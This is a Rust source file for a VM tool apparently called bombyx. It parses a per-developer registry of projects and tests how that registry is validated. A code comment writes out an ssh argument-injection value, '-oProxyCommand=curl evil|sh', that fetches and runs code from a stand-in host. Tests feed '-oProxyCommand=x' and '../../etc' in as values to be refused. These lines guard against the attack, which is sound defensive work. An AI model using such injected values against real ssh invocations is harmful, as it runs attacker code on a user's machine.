//! The per-developer file (`config.toml`), and the project
//! entries in it.
//!
//! This is the file the operator owns. It is not part of any
//! project's repository, so bombyx trusts it the way it trusts
//! a command-line argument: whoever writes it is whoever runs
//! bombyx.
//!
//! It carries two things. A top-level `host` names the machine
//! the VMs run on, and a `[projects.<name>]` table per project
//! carries the settings that describe one VM.
//!
//! Both can name a host, and `super::host` ranks all four
//! sources: `--host`, the `BOMBYX_HOST` environment variable,
//! the named project's own `host` key, then the top-level one.
//! An operator who keeps one project on a different machine
//! writes `host` inside that project's table. The example below
//! shows an entry without one, which is what most entries look
//! like:
//!
//! ```toml
//! host = "vmhost"
//!
//! [projects.myproject]
//! remote_root = "~/vms"
//!
//! [projects.myproject.vm]
//! provider = "libvirt"
//! box = "generic/ubuntu2204"
//! cpus = 4
//! memory = 8192
//!
//! [projects.myproject.source]
//! repo = "https://github.com/you/myproject"
//! ref = "main"
//! script = "vagrant/provision.sh"
//! ```
//!
//! The module has three types. `RegistryFile` parses the file,
//! `Project` parses one `[projects.<name>]` table inside it,
//! and `Registry` is what the rest of the crate holds: the
//! parsed file plus the path it came from.
//!
//! Only `RegistryFile` describes the file as a whole. A second
//! struct doing that would carry its own `deny_unknown_fields`
//! and so refuse the keys the first one names, and the two would
//! drift as the file grows.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::Deserialize;

use super::{
    ConfigError, Source, Symlinks, Vm, default_remote_root, from_toml,
    read_optional,
};
use crate::name::{ProjectName, check_segment};

/// File name of the per-developer configuration, inside the
/// directory [`super::user_config_dir`] returns.
pub const USER_CONFIG_FILE: &str = "config.toml";

/// One project's settings, exactly as its table parses.
///
/// These are the values a `bombyx.toml` carries today, minus
/// `project`: the table key supplies that name, so a project
/// cannot disagree with itself about what it is called.
///
/// Two fields are checked by their own types as the table
/// parses: `repo` is a [`super::RepoUrl`] and `script` a
/// [`super::ScriptPath`], so a bad value fails the parse and
/// names the line. The rest -- `remote_root`, the optional
/// `host`, and `box`, `cpus`, `memory` and `ref` inside the two
/// tables -- have rules that no type carries.
/// `Project::validate` runs those, and [`Registry::project`]
/// calls it before handing an entry out.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Project {
    /// Root directory on the VM host under which this
    /// project's directories are created.
    ///
    /// Per project rather than a top-level default with an
    /// override, so there is one place to look for the value.
    ///
    /// A `String` rather than a type enforcing the rules that
    /// `super::root::check` holds, and that is a gap rather than
    /// a decision. It stays a `String` here because
    /// `super::Config::remote_root` is one too, and a type
    /// introduced on one of the two would have to be unwrapped
    /// again to build the other. `newtype-remaining-config-
    /// fields` in `docs/todo.md` is the work that gives both of
    /// them one. Until then `Project::validate` runs the
    /// rules.
    #[serde(default = "default_remote_root")]
    pub remote_root: String,

    /// The VM host this one project runs on, when it does not
    /// run on the machine the file-wide `host` names.
    ///
    /// Optional, and absent from most entries. It exists for
    /// the operator who keeps one project on a different
    /// machine: without it they type `--host` on every command
    /// for that project and rely on remembering to.
    ///
    /// A `String` rather than a checked type, and the reason is
    /// the third of the three cases `CLAUDE.md` allows: a
    /// standard type already carries the meaning, because
    /// `super::Config::host` is a `String` too and this value
    /// becomes that one. A newtype on this field alone would be
    /// unwrapped at that boundary, which is where the rule has
    /// already run.
    ///
    /// So the rule runs instead of the type, and it runs on both
    /// paths that reach the value: `super::Config::load` runs
    /// `host_problem` once the ranking has picked a winner, so
    /// the error names whichever source supplied the bad value,
    /// and `Project::validate` runs the same function for
    /// anything asking [`Registry::project`] for the entry
    /// directly.
    pub host: Option<String>,

    /// The machine to build.
    pub vm: Vm,

    /// Where the guest clones the project from.
    pub source: Source,
}

/// The per-developer file, as it parses.
///
/// `deny_unknown_fields` refuses every key this struct does not
/// name, so a misspelt setting is reported instead of quietly
/// doing nothing.
///
/// Private, and separate from [`Registry`], because a
/// `Registry` must carry the path it was read from and serde
/// cannot supply one. Deriving `Deserialize` on the public type
/// would hand every caller a second constructor that skips
/// [`parse`] and leaves the path blank -- the same gap
/// `super::Config`'s public fields leave, and avoidable here.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RegistryFile {
    host: Option<String>,

    /// One entry per project, keyed by project name.
    ///
    /// The key is a [`ProjectName`] rather than a `String`
    /// because it becomes a directory name on the VM host. A
    /// table named `"../../etc"` is refused while the file is
    /// being read, before anything can join it onto
    /// `remote_root`.
    ///
    /// A file with no `[projects.*]` table at all parses to an
    /// empty map. A registry naming only a host is a legitimate
    /// file: an operator who never asks bombyx for a project
    /// entry still needs somewhere to put `host`.
    #[serde(default)]
    projects: BTreeMap<ProjectName, Project>,
}

/// The per-developer file, and the path it was read from.
///
/// The module's own `parse` is the only way to build one, so
/// every `Registry` in existence knows which file it came from
/// and an error can never name a file bombyx did not open.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Registry {
    /// The file this was read from, for error messages.
    path: PathBuf,

    /// The VM host, when the operator put one here.
    ///
    /// Private, like `projects`. Both are reached through a
    /// method, so neither can be read without the caller going
    /// past this module's own doc comment.
    host: Option<String>,

    projects: BTreeMap<ProjectName, Project>,
}

impl Project {
    /// Runs the rules no type on these fields carries.
    ///
    /// Each rule lives in the module that owns the field, and
    /// this function states none of them: it calls
    /// `super::root::check` for `remote_root`, then the `[vm]`
    /// and `[source]` checks, then `super::host::host_problem`
    /// for an entry that names its own host.
    /// `super::Config::validate` calls the same ones, and the
    /// two agree because neither holds a copy of a rule.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Empty`] or
    /// [`ConfigError::Invalid`], naming the field that broke its
    /// rule.
    fn validate(&self) -> Result<(), ConfigError> {
        super::root::check(&self.remote_root)?;
        super::vm::validate(&self.vm)?;
        super::source::validate(&self.source)?;
        // `host` reaches `ssh` as its first positional argument
        // and `ssh` honours no `--` separator, so
        // `-oProxyCommand=curl evil|sh` runs code on the
        // workstation. `super::host::host_problem` holds the
        // rule and this calls it, so the entry lookup and the
        // ranking cannot come to disagree about what a legal
        // host looks like.
        if let Some(host) = &self.host
            && let Some(problem) = super::host_problem(host)
        {
            return Err(match problem {
                super::HostProblem::Empty => {
                    ConfigError::Empty { field: "host" }
                }
                super::HostProblem::Invalid(reason) => ConfigError::Invalid {
                    field: "host",
                    reason,
                },
            });
        }
        Ok(())
    }
}

impl Registry {
    /// Reads the registry from `dir`, if there is one.
    ///
    /// Absence is `None`: an operator who passes `--host` and
    /// names no project needs no such file. Anything else --
    /// unreadable, not a plain file, not TOML -- is an error,
    /// because a file that exists and cannot be understood is a
    /// mistake to report rather than a reason to carry on with
    /// different settings.
    ///
    /// Symlinks are followed. `super::read`'s `Symlinks` type
    /// owns that argument and is where it is written down; do
    /// not restate it here, because the copy in this module
    /// would then have to be corrected too.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Read`], [`ConfigError::NotAFile`],
    /// [`ConfigError::TooLarge`] or [`ConfigError::Parse`], each
    /// naming the registry file.
    pub fn read(dir: &Path) -> Result<Option<Self>, ConfigError> {
        let path = path(dir);
        let Some(source) = read_optional(&path, Symlinks::Follow)? else {
            return Ok(None);
        };
        Ok(Some(parse(&source, &path)?))
    }

    /// Returns the VM host this file names, if it names one.
    ///
    /// **Unchecked, unlike [`Registry::project`].** The rules
    /// for a host value live in `super::host`, and
    /// `super::Config::load` runs them once the ranking across
    /// all four sources -- `--host`, the environment, and the
    /// two keys in this file -- has picked a winner, so the
    /// error can name the source that supplied
    /// the bad value. Checking here as well would report a value
    /// this file supplies even on a run that never uses it.
    #[must_use]
    pub fn host(&self) -> Option<&str> {
        self.host.as_deref()
    }

    /// Returns the VM host specified by the entry for `name`,
    /// together with the map key that carried it.
    ///
    /// The key comes back because a caller reporting where the
    /// host came from wants the table heading as this file
    /// spells it, and re-parsing `name` into a [`ProjectName`]
    /// would be checking a value the lookup has already proved
    /// legal.
    ///
    /// **Absence is `None`, never an error.** A name with no
    /// table, and a name no table key could hold, both answer
    /// `None`, because asking which host a project prefers is
    /// not asking for its entry. [`Registry::project`] is what
    /// reports a missing entry, once, with a message saying
    /// which table to write.
    ///
    /// **No rule runs on the value returned**, neither the host
    /// rule nor the rest of `Project::validate`. Two separate
    /// reasons, and both are about reporting the problem in the
    /// right place. `super::Config::load` runs
    /// `super::host_problem` once the ranking has picked a
    /// winner, so the error names the source that supplied the
    /// bad value rather than one this run never consulted. And
    /// an entry whose `cpus` is zero still supplies its host
    /// here, because refusing would demote that project to the
    /// file-wide host and boot its VM on the wrong machine,
    /// while the broken value is reported anyway the moment
    /// anything asks [`Registry::project`] for the entry.
    ///
    /// That is also why this is `pub(crate)`: the guarantee that
    /// a leading `-` never reaches `ssh` rests on `Config::load`
    /// running the rule, and handing the unchecked value outside
    /// the crate would put that guarantee in a caller's hands.
    pub(crate) fn project_host(
        &self,
        name: &str,
    ) -> Option<(&ProjectName, &str)> {
        let (key, project) = self.projects.get_key_value(name)?;
        Some((key, project.host.as_deref()?))
    }

    /// Returns the entry for `name`.
    ///
    /// The error names the file this registry was read from, so
    /// the operator knows which file to edit.
    ///
    /// A missing entry is an error rather than something bombyx
    /// fills in. Writing an entry on the operator's behalf means
    /// guessing a repository address and a provisioning script,
    /// and a guessed entry that boots the wrong VM is worse than
    /// a message saying what to type.
    ///
    /// **Only the value rules wait until here.** A table that
    /// does not parse fails the whole file, whichever project
    /// was asked for. `super::host` opens the registry only when
    /// neither `--host` nor the environment names a host, so a
    /// broken table cannot stop a run that gets its host another
    /// way.
    ///
    /// What waits is whatever `Project::validate` runs. The
    /// project name waits for nothing: it is a map key, and
    /// serde builds the map before any code here runs, so
    /// [`ProjectName`] checks it during the parse.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Invalid`] when `name` is not a
    /// legal project name, [`ConfigError::ProjectNotFound`] when
    /// the file has no table for it, and
    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] when
    /// the entry it does have breaks a rule.
    pub fn project(&self, name: &str) -> Result<&Project, ConfigError> {
        // Checked before the map is consulted, because
        // `ProjectNotFound` tells the operator to add
        // `[projects.<name>]` -- and for a name no key can hold,
        // that table is refused by the parser, so following the
        // advice would break the whole file.
        check_segment(name).map_err(|e| ConfigError::Invalid {
            field: "project",
            reason: e.to_string(),
        })?;
        let project = self.projects.get(name).ok_or_else(|| {
            ConfigError::ProjectNotFound {
                name: name.to_owned(),
                path: self.path.clone(),
            }
        })?;
        project.validate()?;
        Ok(project)
    }
}

/// The registry file inside `dir`.
///
/// One spelling of the join, so an error message and the file
/// actually opened cannot name different paths.
pub(super) fn path(dir: &Path) -> PathBuf {
    dir.join(USER_CONFIG_FILE)
}

/// Parses `source` as the registry read from `path`.
///
/// The only way to build a [`Registry`], so the path in an
/// error message is always the path the text came from.
///
/// # Errors
///
/// Returns [`ConfigError::Parse`] when `source` is not valid
/// TOML or carries a key the registry does not define.
fn parse(source: &str, path: &Path) -> Result<Registry, ConfigError> {
    let file: RegistryFile = from_toml(source, path)?;
    Ok(Registry {
        path: path.to_path_buf(),
        host: file.host,
        projects: file.projects,
    })
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use super::*;
    use crate::config::Provider;

    /// A registry naming one project, `myproject`.
    ///
    /// Copied by hand from the example in this module's header,
    /// key for key. The header is what a reader writes their own
    /// file from, so a field renamed here without renaming it
    /// there fails a test rather than misleading them.
    fn registry_toml() -> String {
        "host = \"vmhost\"\n\n\
         [projects.myproject]\n\
         remote_root = \"~/vms\"\n\n\
         [projects.myproject.vm]\n\
         provider = \"libvirt\"\n\
         box = \"generic/ubuntu2204\"\n\
         cpus = 4\n\
         memory = 8192\n\n\
         [projects.myproject.source]\n\
         repo = \"https://github.com/you/myproject\"\n\
         ref = \"main\"\n\
         script = \"vagrant/provision.sh\"\n"
            .to_owned()
    }

    /// A `[projects.<name><suffix>]` header, name quoted so any
    /// character survives into the key.
    fn fmt_key(name: &str, suffix: &str) -> String {
        format!("[projects.{name:?}{suffix}]")
    }

    /// Parses `source` as a registry read from `path`.
    fn parse_at(source: &str, path: &str) -> Result<Registry, ConfigError> {
        parse(source, Path::new(path))
    }

    /// Parses `source` as a registry from a plausible path.
    fn parsed(source: &str) -> Registry {
        parse_at(source, "/home/dev/config.toml").unwrap()
    }

    /// The host `name`'s entry names, without the key beside it.
    fn host_of<'a>(registry: &'a Registry, name: &str) -> Option<&'a str> {
        registry.project_host(name).map(|(_key, host)| host)
    }

    /// Writes `source` as the registry inside a fresh directory.
    fn registry_dir(source: &str) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(path(dir.path()), source).unwrap();
        dir
    }

    #[test]
    fn an_entry_carries_the_settings_that_describe_one_vm() {
        let registry = parsed(&registry_toml());
        let project = registry.project("myproject").unwrap();
        assert_eq!(project.remote_root, "~/vms");
        assert_eq!(project.vm.provider, Provider::Libvirt);
        assert_eq!(project.vm.cpus, 4);
        assert_eq!(project.vm.memory, 8192);
        assert_eq!(project.source.git_ref, "main");
        assert_eq!(project.source.script.as_str(), "vagrant/provision.sh");
    }

    #[test]
    fn the_table_key_is_what_names_a_project() {
        // A name nobody wrote a table for must not find the
        // one table that is there.
        let registry = parsed(&registry_toml());
        let err = registry.project("other").unwrap_err();
        assert!(matches!(err, ConfigError::ProjectNotFound { .. }));
    }

    #[test]
    fn a_missing_entry_names_the_file_and_the_keys_it_needs() {
        // The operator has to type the entry themselves, so the
        // message has to say what to type and where.
        let registry = parsed("host = \"vmhost\"\n");
        let err = registry.project("myproject").unwrap_err().to_string();
        assert!(err.contains("/home/dev/config.toml"), "{err}");
        assert!(err.contains("[projects.myproject]"), "{err}");
        assert!(err.contains("[projects.myproject.vm]"), "{err}");
        assert!(err.contains("[projects.myproject.source]"), "{err}");
        assert!(err.contains("remote_root"), "{err}");
    }

    #[test]
    fn a_looked_up_entry_has_had_its_values_checked() {
        // Holding a `&Project` has to be proof the values
        // passed, the way holding a `Config` is. Each of these
        // breaks a rule owned by a different module.
        for (from, to) in [
            ("remote_root = \"~/vms\"", "remote_root = \"/\""),
            ("cpus = 4", "cpus = 0"),
            ("memory = 8192", "memory = 0"),
            (
                "box = \"generic/ubuntu2204\"",
                "box = \"generic/ubuntu\\\"2204\"",
            ),
            ("ref = \"main\"", "ref = \"\""),
            (
                "remote_root = \"~/vms\"",
                "remote_root = \"~/vms\"\nhost = \"-oProxyCommand=x\"",
            ),
            (
                "remote_root = \"~/vms\"",
                "remote_root = \"~/vms\"\nhost = \"\"",
            ),
        ] {
            let source = registry_toml().replace(from, to);
            let registry = parsed(&source);
            assert!(
                registry.project("myproject").is_err(),
                "{to} was accepted"
            );
        }
    }

    #[test]
    fn a_project_entry_may_name_its_own_host() {
        // An operator who keeps one project on another
        // machine has no other way to record that choice:
        // `--host` covers a single run and nothing else
        // remembers it.
        let source = registry_toml().replace(
            "[projects.myproject]\n",
            "[projects.myproject]\nhost = \"otherbox\"\n",
        );
        let registry = parsed(&source);
        assert_eq!(host_of(&registry, "myproject"), Some("otherbox"));
    }

    #[test]
    fn an_entry_with_no_host_of_its_own_supplies_none() {
        // The key is optional, so most entries leave the
        // file-wide `host` to apply.
        let registry = parsed(&registry_toml());
        assert_eq!(host_of(&registry, "myproject"), None);
    }

    #[test]
    fn a_name_with_no_entry_supplies_no_host() {
        // Including a name no table key could hold. Asking for
        // a host is not asking for the entry, so this reports
        // absence rather than the error `project` raises.
        let registry = parsed(&registry_toml());
        for name in ["other", "", "../../etc", "-x"] {
            assert_eq!(host_of(&registry, name), None, "{name:?}");
        }
    }

    #[test]
    fn a_host_survives_a_broken_value_elsewhere_in_its_entry() {
        // `project_host` runs no checks, exactly as `host`
        // runs none. Were it to validate, an entry with a bad
        // `cpus` would quietly demote its host to the
        // file-wide one and boot the VM on the wrong machine.
        // The entry's own error still arrives, from `project`.
        let source = registry_toml()
            .replace(
                "[projects.myproject]\n",
                "[projects.myproject]\nhost = \"otherbox\"\n",
            )
            .replace("cpus = 4", "cpus = 0");
        let registry = parsed(&source);
        assert_eq!(host_of(&registry, "myproject"), Some("otherbox"));
        assert!(registry.project("myproject").is_err());
    }

    #[test]
    fn remote_root_falls_back_to_the_default() {
        let source = registry_toml().replace("remote_root = \"~/vms\"\n", "");
        let registry = parsed(&source);
        let project = registry.project("myproject").unwrap();
        assert_eq!(project.remote_root, default_remote_root());
    }

    #[test]
    fn a_project_table_refuses_a_key_it_does_not_know() {
        // `project` is the table key, so writing it inside the
        // table is a mistake worth reporting rather than a
        // second opinion on the name.
        let source = registry_toml().replace(
            "[projects.myproject]\n",
            "[projects.myproject]\nproject = \"other\"\n",
        );
        let err = parse_at(&source, USER_CONFIG_FILE).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("project"), "{err}");
    }

    #[test]
    fn a_project_name_that_is_not_one_path_segment_is_refused() {
        // The key becomes a directory name on the VM host,
        // joined onto `remote_root` and handed to `mkdir` and
        // `rm -rf`. `Config.project` gets the same rule, and a
        // rule protects the primitive rather than the field
        // name.
        //
        // The whole family, not just the case that prompted it:
        // empty, `.`, `..`, a traversal, a leading dash, an
        // embedded separator, a trailing separator.
        for bad in [
            "",
            ".",
            "..",
            "../../etc",
            "-oProxyCommand=x",
            "a/b",
            "a/",
            "a\\b",
            "sp ace",
        ] {
            // Every one of the three table headers is
            // renamed. Renaming only the first leaves the `vm`
            // and `source` tables behind under the old name, and
            // the parse then fails on a missing field -- which
            // looks exactly like the guard working.
            let source = registry_toml()
                .replace("[projects.myproject]", &fmt_key(bad, ""))
                .replace("[projects.myproject.vm]", &fmt_key(bad, ".vm"))
                .replace(
                    "[projects.myproject.source]",
                    &fmt_key(bad, ".source"),
                );
            let err = parse_at(&source, USER_CONFIG_FILE).unwrap_err();
            assert!(
                matches!(err, ConfigError::Parse { .. }),
                "{bad:?} was accepted"
            );
            // The operator has to find the table that is wrong,
            // so the message names the file and says which rule
            // the key broke.
            let text = err.to_string();
            assert!(text.contains(USER_CONFIG_FILE), "{text}");
            assert!(text.contains("must ") || text.contains("empty"), "{text}");
        }
    }

    #[test]
    fn a_name_no_table_could_carry_is_refused_not_reported_absent() {
        // "not found -- add `[projects.../etc]`" is advice the
        // operator cannot take: that table is refused by the
        // parser, so typing it breaks the whole file. The
        // requested name gets the same rule the key does.
        let registry = parsed(&registry_toml());
        for bad in ["", "..", "../../etc", "-x", "a/b"] {
            let err = registry.project(bad).unwrap_err();
            assert!(
                matches!(
                    err,
                    ConfigError::Invalid {
                        field: "project",
                        ..
                    }
                ),
                "{bad:?} reported as {err}"
            );
        }
        // A name of a legal shape that is simply absent still
        // reports absence, which is the case the message is for.
        assert!(matches!(
            registry.project("myprojekt").unwrap_err(),
            ConfigError::ProjectNotFound { .. }
        ));
    }

    #[test]
    fn a_registry_with_no_projects_at_all_still_parses() {
        // A registry naming only a host is a legitimate file,
        // so the projects table has to be optional.
        let registry = parsed("host = \"vmhost\"\n");
        assert_eq!(registry.host.as_deref(), Some("vmhost"));
        assert!(registry.projects.is_empty());
    }

    #[test]
    fn a_missing_registry_file_is_not_an_error() {
        let dir = tempfile::tempdir().unwrap();
        assert!(Registry::read(dir.path()).unwrap().is_none());
    }

    #[test]
    fn read_parses_the_file_in_the_directory() {
        let dir = registry_dir(&registry_toml());
        let registry = Registry::read(dir.path()).unwrap().unwrap();
        assert!(registry.project("myproject").is_ok());
    }

    #[test]
    fn a_miss_names_the_file_the_registry_was_read_from() {
        // The registry carries its own path, so no caller can
        // hand the error a different one.
        let dir = registry_dir(&registry_toml());
        let registry = Registry::read(dir.path()).unwrap().unwrap();
        let err = registry.project("other").unwrap_err().to_string();
        assert!(
            err.contains(&path(dir.path()).display().to_string()),
            "{err}"
        );
    }

    #[test]
    fn a_registry_that_is_not_toml_names_the_file() {
        let dir = registry_dir("host = \n");
        let err = Registry::read(dir.path()).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains(USER_CONFIG_FILE), "{err}");
    }
}
